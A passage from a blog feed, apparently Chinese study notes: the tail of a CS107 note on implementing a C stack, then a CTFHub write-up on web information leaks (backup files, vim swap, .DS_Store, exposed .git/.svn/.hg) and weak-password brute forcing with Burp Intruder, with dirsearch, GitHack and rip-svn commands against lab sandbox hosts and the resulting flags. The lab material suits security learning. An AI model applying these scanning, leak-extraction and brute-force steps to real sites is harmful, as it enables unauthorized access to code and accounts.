vp1，系统就会误把存储着字符串的地址认为是字符串，所以不能够直接强制转换为 char*。</p>\n<p>favoriteNote 是一个 char * 类型的变量，&amp;favoriteNote 是一个 char ** 类型的变量，当然也可以传入 favoriteNote，但是这样就破坏了函数变量处理的对称性，因为在之后的处理中，我们的 vp 都是 char ** 进行处理的，而 favoriteNote 按 char * 进行处理。</p>\n<h2 id=\"实现一个栈stackh\"><a class=\"markdownIt-Anchor\" href=\"#实现一个栈stackh\">#</a> 实现一个栈 Stack.h</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> logicalLen<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 已经使用的内存</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 申请的内存大小</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上述的结构是 12 字节的，并且都是隐式的 public，但是我们要将其当作黑盒来处理，使用外在的函数对结构进行操作。</p>\n<p>当执行下面代码时，c 会为你保留一部分内存空间，但不会像 java 那样将内存空间清 0。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack s<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/image-20231104105236562.png\" alt=\"image-20231104105236562\"></p>\n<p>假设，当我们使用 StackNew (&amp;s); 时，系统会预申请一个能存入 4 个 int 的大小空间，这时进行任何操作都是非常迅速的，因为空间已经提前申请好了；当存入的数超过 4 个时，系统会再申请一个翻倍的空间，并把原先空间中的内容搬过来，原先空间删除。</p>\n<p>下面实现一部分内容：</p>\n<p><code>s</code>  是一个局部变量，它假设的是它指向的是一个 12 字节的内存空间，并且内容未知。</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/image-20231104110715544.png\" alt=\"image-20231104110715544\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>logicallen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>allocLen <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 动态分配内存函数，返回这一大块内存地址的开始地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 如果 assert 里面的内容为 false，assert 会终止程序，并告知终止位置</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/30/WEB%20%E5%AD%A6%E4%B9%A0%202023.10.23/",
            "url": "http://yanagi-kon.github.io/2023/10/30/WEB%20%E5%AD%A6%E4%B9%A0%202023.10.23/",
            "title": "WEB 学习 2023.10.23",
            "date_published": "2023-10-30T04:24:13.000Z",
            "content_html": "<h1 id=\"web-学习-20231023\"><a class=\"markdownIt-Anchor\" href=\"#web-学习-20231023\">#</a> WEB 学习 2023.10.23</h1>\n<h1 id=\"信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#信息泄露\">#</a> 信息泄露</h1>\n<h2 id=\"备份文件下载\"><a class=\"markdownIt-Anchor\" href=\"#备份文件下载\">#</a> 备份文件下载</h2>\n<h3 id=\"phpinfo\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo\">#</a> PHPINFO</h3>\n<p>打开环境直接浏览器搜索 ctf 即可找到对应的 flag：</p>\n<p><img data-src=\"image-20231023102957376.png\" alt=\"image-20231023102957376\"></p>\n<p><code>ctfhub&#123;5deb0c24242cf420fed9cfa1&#125;</code></p>\n<h3 id=\"网站源码\"><a class=\"markdownIt-Anchor\" href=\"#网站源码\">#</a> 网站源码</h3>\n<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<h4 id=\"0x01-提示\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示\">#</a> 0x01 提示</h4>\n<p><strong>常见的网站源码备份文件后缀</strong></p>\n<hr>\n<ul>\n<li>tar</li>\n<li>tar.gz</li>\n<li>zip</li>\n<li>rar</li>\n</ul>\n<p><strong>常见的网站源码备份文件名</strong></p>\n<hr>\n<ul>\n<li>web</li>\n<li>website</li>\n<li>backup</li>\n<li>back</li>\n<li>www</li>\n<li>wwwroot</li>\n<li>temp</li>\n</ul>\n<h4 id=\"0x02-使用-dirsearch-查找\"><a class=\"markdownIt-Anchor\" href=\"#0x02-使用-dirsearch-查找\">#</a> 0x02 使用 dirsearch 查找</h4>\n<p>使用以下命令：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirsearch <span class=\"token parameter variable\">-u</span> http://challenge-c3d0a76d9273c7c1.sandbox.ctfhub.com:10800/</pre></td></tr></table></figure><p>可得：</p>\n<p><img data-src=\"image-20231023103710014.png\" alt=\"image-20231023103710014\"></p>\n<p>直接下载文件 www.zip 并进行解压：</p>\n<p><img data-src=\"image-20231023104034805.png\" alt=\"image-20231023104034805\"></p>\n<h4 id=\"0x03-二次隐藏\"><a class=\"markdownIt-Anchor\" href=\"#0x03-二次隐藏\">#</a> 0x03 二次隐藏</h4>\n<p>得到一个名为  <code>flag_33496031.txt</code>  的文件，打开之后并没有 flag，重新在网站中查找相关信息：</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token scheme\">http<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">challenge-c3d0a76d9273c7c1.sandbox.ctfhub.com</span><span class=\"token port-segment\"><span class=\"token port-delimiter\">:</span><span class=\"token port\">10800</span></span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>flag_33496031.txt</span></pre></td></tr></table></figure><p><img data-src=\"image-20231023104442099.png\" alt=\"image-20231023104442099\"></p>\n<p>得到 flag： <code>ctfhub&#123;77f725d5968d87ba19a72640&#125;</code></p>\n<h3 id=\"bak文件\"><a class=\"markdownIt-Anchor\" href=\"#bak文件\">#</a> bak 文件</h3>\n<h4 id=\"0x01-提示-2\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-2\">#</a> 0x01 提示</h4>\n<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<h4 id=\"0x02-题目\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023105433198.png\" alt=\"image-20231023105433198\"></p>\n<h4 id=\"0x03-使用-dirsearch-进行查找\"><a class=\"markdownIt-Anchor\" href=\"#0x03-使用-dirsearch-进行查找\">#</a> 0x03 使用 dirsearch 进行查找：</h4>\n<p><img data-src=\"image-20231023105420938.png\" alt=\"image-20231023105420938\"></p>\n<p>找到了一个 bak 文件，进行下载，使用记事本打开，即可获得 flag</p>\n<p><img data-src=\"image-20231023105614392.png\" alt=\"image-20231023105614392\"></p>\n<p><code>ctfhub&#123;93f00169cf75b69bd006441b&#125;</code></p>\n<h3 id=\"vim缓存\"><a class=\"markdownIt-Anchor\" href=\"#vim缓存\">#</a> vim 缓存</h3>\n<h4 id=\"0x01-提示-3\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-3\">#</a> 0x01 提示</h4>\n<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>\n<h4 id=\"0x02-题目-2\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-2\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023105952658.png\" alt=\"image-20231023105952658\"></p>\n<h4 id=\"0x03-方法一-使用-dirsearch-延时查找\"><a class=\"markdownIt-Anchor\" href=\"#0x03-方法一-使用-dirsearch-延时查找\">#</a> 0x03 方法一 ：使用 dirsearch 延时查找</h4>\n<pre><code>dirsearch -u http://challenge-f8ac603be2129fb8.sandbox.ctfhub.com:10800 -s 1    # 延时1秒\n</code></pre>\n<p><img data-src=\"image-20231023111535783.png\" alt=\"image-20231023111535783\"></p>\n<h4 id=\"0x04-方法二了解相关文件名\"><a class=\"markdownIt-Anchor\" href=\"#0x04-方法二了解相关文件名\">#</a> 0x04 方法二：了解相关文件名</h4>\n<p>vim 在运行过程中会产生 swp 文件，如果程序异常退出 swp 文件可能被保留，第二次异常就变成 swo，第三次变成 swn。按照上题的思路，在原题 url 中加入  <code>.index.php.swp</code> ，文件名的最前面要有一个 “.”。</p>\n<p>下载文件  <code>.index.php.swp</code> ，打开进行查找：</p>\n<p><img data-src=\"image-20231023110947994.png\" alt=\"image-20231023110947994\"></p>\n<p>flag 为 ： <code>ctfhub&#123;70e0afb290e77337cb06d325&#125;</code></p>\n<h3 id=\"ds_store\"><a class=\"markdownIt-Anchor\" href=\"#ds_store\">#</a> .DS_Store</h3>\n<h4 id=\"0x01-提示-4\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-4\">#</a> 0x01 提示</h4>\n<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store 可以知道这个目录里面所有文件的清单。</p>\n<h4 id=\"0x02-题目-3\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-3\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023112241272.png\" alt=\"image-20231023112241272\"></p>\n<h4 id=\"0x03-解\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解\">#</a> 0x03 解</h4>\n<p>直接访问：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/.DS_Store</pre></td></tr></table></figure><p>或者使用 dirsearch 可以得知，网站可访问  <code>.DS_Store</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirsearch <span class=\"token parameter variable\">-u</span> http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/ <span class=\"token parameter variable\">-s</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p><img data-src=\"image-20231023112400093.png\" alt=\"image-20231023112400093\"></p>\n<p>下载该文件，并使用记事本打开：</p>\n<p><img data-src=\"image-20231023112455877.png\" alt=\"image-20231023112455877\"></p>\n<p>得到  <code>6453df75efb4542d8ba3dc7d4ab53fc2.txt</code>  就是我们需要二次访问的文件地址</p>\n<p>访问得到 flag</p>\n<pre><code>http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/6453df75efb4542d8ba3dc7d4ab53fc2.txt\n</code></pre>\n<p><img data-src=\"image-20231023112201977.png\" alt=\"image-20231023112201977\"></p>\n<p><code>ctfhub&#123;83d1b8a015ecfa71c468b5e3&#125;</code></p>\n<h2 id=\"git泄露\"><a class=\"markdownIt-Anchor\" href=\"#git泄露\">#</a> Git 泄露</h2>\n<h3 id=\"log\"><a class=\"markdownIt-Anchor\" href=\"#log\">#</a> Log</h3>\n<h4 id=\"0x01-提示-5\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-5\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-4\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-4\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023145909878.png\" alt=\"image-20231023145909878\"></p>\n<h4 id=\"0x03-解答\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答\">#</a> 0x03 解答</h4>\n<p>根据提示使用 GitHack 工具对网站的 .git 文件进行处理</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python2 GitHack.py http://challenge-87d743a3ff8b665c.sandbox.ctfhub.com:10800/.git</pre></td></tr></table></figure><p><img data-src=\"image-20231023150501551.png\" alt=\"image-20231023150501551\"></p>\n<p><img data-src=\"image-20231023150549583.png\" alt=\"image-20231023150549583\"></p>\n<p>之后我们 cd 进入到克隆的文件夹中，使用 git log 查看 git 的历史记录：</p>\n<figure class=\"highlight git\"><figcaption data-lang=\"git\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git log</pre></td></tr></table></figure><p><img data-src=\"image-20231023151232167.png\" alt=\"image-20231023151232167\"></p>\n<p>可以看到，最近的一次操作是将 flag 移除了，为了得到 flag 我们需要回退到 add flag 那个分支上。</p>\n<pre><code>git reset --hard HEAD^\n</code></pre>\n<p><img data-src=\"image-20231023151533695.png\" alt=\"image-20231023151533695\"></p>\n<hr>\n<p>也可以使用</p>\n<pre><code>git diff HEAD^\n</code></pre>\n<p>通过比较两个版本的不同，也可以得到正确答案。</p>\n<hr>\n<p>此时就可以查看到 flag 文件了</p>\n<p><img data-src=\"image-20231023151607766.png\" alt=\"image-20231023151607766\"></p>\n<p><code>ctfhub&#123;003a15e85e08f988da3d91b7&#125;</code></p>\n<h3 id=\"stash\"><a class=\"markdownIt-Anchor\" href=\"#stash\">#</a> Stash</h3>\n<h4 id=\"0x01-提示-6\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-6\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-5\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-5\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023153203629.png\" alt=\"image-20231023153203629\"></p>\n<h4 id=\"0x03-解答-2\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-2\">#</a> 0x03 解答</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG9jeS9wL2dpdC1zdGFzaC1yZWZlcmVuY2UuaHRtbA==\">git stash 用法</span></p>\n<p><code>git stash</code> （git 储藏）会把所有未提交的修改（包括暂存的和非暂存的）都保存起来，用于后续恢复当前工作目录。</p>\n<pre><code>git stash list\t\t//查看现有stash\ngit stash pop\t\t//恢复之前缓存的工作目录\n</code></pre>\n<p>首先使用 GitHack 得到 git 文件夹</p>\n<pre><code>python2 GitHack.py http://challenge-fb9e5bf47ae06169.sandbox.ctfhub.com:10800/.git\n</code></pre>\n<p>进入文件夹，使用 git stash list 查看现有的 stash</p>\n<p><img data-src=\"image-20231023154642571.png\" alt=\"image-20231023154642571\"></p>\n<p>再使用 git stash pop 恢复之前缓存的工作目录</p>\n<p><img data-src=\"image-20231023154822527.png\" alt=\"image-20231023154822527\"></p>\n<p>得到我们需要的 flag 所在的文件，获取即可</p>\n<p><img data-src=\"image-20231023154849548.png\" alt=\"image-20231023154849548\"></p>\n<p><code>ctfhub&#123;5bf4e75c6fa8396319a1a39a&#125;</code></p>\n<h3 id=\"index\"><a class=\"markdownIt-Anchor\" href=\"#index\">#</a> Index</h3>\n<h4 id=\"0x01-提示-7\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-7\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-6\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-6\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023155043808.png\" alt=\"image-20231023155043808\"></p>\n<h4 id=\"0x03-解答-3\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-3\">#</a> 0x03 解答</h4>\n<p>本题感觉没什么特别的，使用 GitHack 直接对 git 文件进行提取，在文件夹中直接查看 log 就可以得知当前状态就是含有 flag 的状态，直接获取 flag 文件即可</p>\n<p><img data-src=\"image-20231023155719415.png\" alt=\"image-20231023155719415\"></p>\n<p><code>ctfhub&#123;8197e9362ebfd50e1be1e9bf&#125;</code></p>\n<h2 id=\"svn泄露\"><a class=\"markdownIt-Anchor\" href=\"#svn泄露\">#</a> SVN 泄露</h2>\n<h4 id=\"0x01-提示-8\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-8\">#</a> 0x01 提示</h4>\n<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当，可能会将.svn 文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>\n<h4 id=\"0x02-题目-7\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-7\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023160418343.png\" alt=\"image-20231023160418343\"></p>\n<h4 id=\"0x03-解答-4\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-4\">#</a> 0x03 解答</h4>\n<p>首先使用 dirsearch 进行一下内容查看</p>\n<pre><code>dirsearch -u http://challenge-a61e31b7c2e824c9.sandbox.ctfhub.com:10800/ -s 1\n</code></pre>\n<p>发现了 svn 文件</p>\n<p><img data-src=\"image-20231023160624976.png\" alt=\"image-20231023160624976\"></p>\n<p>我们在 kali 中，使用  <code>dvcs-ripper</code>  中的 <code>rip-svn.pl</code>  脚本进行 clone：</p>\n<pre><code>perl rip-svn.pl -u http://challenge-5849ad3280c96ef4.sandbox.ctfhub.com:10800/.svn\n</code></pre>\n<p><img data-src=\"image-20231023172757585.png\" alt=\"image-20231023172757585\"></p>\n<p>使用  <code>ls -al</code>  查看新增加的文件</p>\n<p><img data-src=\"image-20231023172917893.png\" alt=\"image-20231023172917893\"></p>\n<p>前往 .svn 文件夹内</p>\n<p><img data-src=\"image-20231023173024409.png\" alt=\"image-20231023173024409\"></p>\n<p>可以发现 wc.db 文件在其中，使用如下命令，查找有关 flag 的内容</p>\n<pre><code>cat wc.db | grep -a flag\n</code></pre>\n<p>发现 flag 但是如果直接访问会发现不存在</p>\n<p><img data-src=\"image-20231023173557538.png\" alt=\"image-20231023173557538\"></p>\n<p><img data-src=\"image-20231023173133950.png\" alt=\"image-20231023173133950\"></p>\n<p>转而寻找  <code>.svn/pristine/</code>  中的文件</p>\n<p><img data-src=\"image-20231023173251159.png\" alt=\"image-20231023173251159\"></p>\n<p>可以发现有两个字典  <code>bf</code>  和  <code>64</code></p>\n<p>使用  <code>cat bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base</code>  得到：</p>\n<p><img data-src=\"image-20231023173328598.png\" alt=\"image-20231023173328598\"></p>\n<p>我们在数据库中可以找到对应关系：</p>\n<p><img data-src=\"image-20231023173355946.png\" alt=\"image-20231023173355946\"></p>\n<p><img data-src=\"image-20231023173404918.png\" alt=\"image-20231023173404918\"></p>\n<p>可以发现，第一个开头是 bf 的，对应的正是 index.html，那么我们只要使用 下方 64 开头的进行字典对应，就可以获得 flag：</p>\n<p><img data-src=\"image-20231023173521812.png\" alt=\"image-20231023173521812\"></p>\n<p><code>ctfhub&#123;9120bf8882d07e7ccafa434f&#125;</code></p>\n<h4 id=\"0x04-备注\"><a class=\"markdownIt-Anchor\" href=\"#0x04-备注\">#</a> 0x04 备注</h4>\n<p>可以直接使用  <code>tree .svn</code>  查看其中的关系</p>\n<p><img data-src=\"image-20231023173816807.png\" alt=\"image-20231023173816807\"></p>\n<h2 id=\"hg泄露\"><a class=\"markdownIt-Anchor\" href=\"#hg泄露\">#</a> HG 泄露</h2>\n<h3 id=\"0x01-提示-9\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-9\">#</a> 0x01 提示</h3>\n<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当，可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>\n<h3 id=\"0x02-题目-8\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-8\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231028093921547.png\" alt=\"image-20231028093921547\"></p>\n<h3 id=\"0x03-解答-5\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-5\">#</a> 0x03 解答</h3>\n<p>首先使用 dirsearch 进行文件检索</p>\n<pre><code>dirsearch -u http://challenge-1bc16caa950039f9.sandbox.ctfhub.com:10800/ -s 0.5\n</code></pre>\n<p><img data-src=\"image-20231028094148045.png\" alt=\"image-20231028094148045\"></p>\n<p>发现了  <code>.hg</code>  文件，尝试访问  <code>dirstate</code>  文件，下载下来，打开后发现：</p>\n<p><img data-src=\"image-20231028094534632.png\" alt=\"image-20231028094534632\"></p>\n<p><code>flag_2785532634.txt</code>  文件，对其进行访问就可以拿到 flag 了：</p>\n<p><img data-src=\"image-20231028094609448.png\" alt=\"image-20231028094609448\"></p>\n<p><code>ctfhub&#123;ec974c7b92f1ba4fceb75f44&#125;</code></p>\n<h1 id=\"密码口令\"><a class=\"markdownIt-Anchor\" href=\"#密码口令\">#</a> 密码口令</h1>\n<h2 id=\"弱口令\"><a class=\"markdownIt-Anchor\" href=\"#弱口令\">#</a> 弱口令</h2>\n<h3 id=\"0x01-提示-10\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-10\">#</a> 0x01 提示</h3>\n<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p>\n<h3 id=\"0x02-题目-9\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-9\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231028100334921.png\" alt=\"image-20231028100334921\"></p>\n<h3 id=\"0x03-burp-suite-intruder的4种攻击类型\"><a class=\"markdownIt-Anchor\" href=\"#0x03-burp-suite-intruder的4种攻击类型\">#</a> 0x03 Burp Suite Intruder 的 4 种攻击类型</h3>\n<h4 id=\"sniper狙击手模式\"><a class=\"markdownIt-Anchor\" href=\"#sniper狙击手模式\">#</a> ** Sniper（狙击手模式）**</h4>\n<p>狙击手模式使用一组 payload 集合，它一次只使用一个 payload 位置，假设你标记了两个位置 “A” 和 “B”，payload 值为 “1” 和 “2”，那么它攻击会形成以下组合（除原始数据外）：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>no replace</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>no replace</td>\n</tr>\n<tr>\n<td>3</td>\n<td>no replace</td>\n<td>1</td>\n</tr>\n<tr>\n<td>4</td>\n<td>no replace</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"battering-ram攻城锤模式\"><a class=\"markdownIt-Anchor\" href=\"#battering-ram攻城锤模式\">#</a> <strong>Battering ram（攻城锤模式）</strong></h4>\n<p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个 payload 集合，不同的地方在于每次攻击都是替换所有 payload 标记位置，而狙击手模式每次只能替换一个 payload 标记位置。</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"pitchfork草叉模式\"><a class=\"markdownIt-Anchor\" href=\"#pitchfork草叉模式\">#</a> <strong>Pitchfork（草叉模式）</strong></h4>\n<p>草叉模式允许使用多组 payload 组合，在每个标记位置上遍历所有 payload 组合，假设有两个位置 “A” 和 “B”，payload 组合 1 的值为 “1” 和 “2”，payload 组合 2 的值为 “3” 和 “4”，则攻击模式如下：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"cluster-bomb集束炸弹模式\"><a class=\"markdownIt-Anchor\" href=\"#cluster-bomb集束炸弹模式\">#</a> <strong>Cluster bomb（集束炸弹模式）</strong></h4>\n<p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对 payload 组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除 baseline 请求外，会有四次请求：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>4</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>3</td>\n</tr>\n<tr>\n<td>4</td>\n<td>2</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"0x04-解题\"><a class=\"markdownIt-Anchor\" href=\"#0x04-解题\">#</a> 0x04 解题</h3>\n<p>解决本题需要使用 Burp 的暴力破解功能，首先随意输入一些内容，进行登录，在 Burp 中可以看到 request 请求：</p>\n<p><img data-src=\"image-20231028100709112.png\" alt=\"image-20231028100709112\"></p>\n<p>右键  <code>send to intruder</code>  / 快捷键 <code>CTRL+I</code>  发送到 intruder 中</p>\n<p>在 Intruder 中在密码部分设置为 payload 添加 符号，作为注入点</p>\n<p><img data-src=\"image-20231029151352738.png\" alt=\"image-20231029151352738\"></p>\n<p>选择密码本进行攻击，多尝试几个密码本就可以找到密码，可以看到，正确登录后的返回长度 2658 和其他长度不一样</p>\n<p><img data-src=\"image-20231029151325266.png\" alt=\"image-20231029151325266\"></p>\n<p>双击查看 response：</p>\n<p><img data-src=\"image-20231029151619413.png\" alt=\"image-20231029151619413\"></p>\n<p>得到 flag： <code>ctfhub&#123;4fbf4b5cf53ff19625acad4f&#125;</code></p>\n<h2 id=\"默认口令\"><a class=\"markdownIt-Anchor\" href=\"#默认口令\">#</a> 默认口令</h2>\n<h3 id=\"0x01-提示-11\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-11\">#</a> 0x01 提示</h3>\n<h3 id=\"0x02-题目-10\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-10\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231029153534085.png\" alt=\"image-20231029153534085\"></p>\n<h3 id=\"0x03-解答-6\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-6\">#</a> 0x03 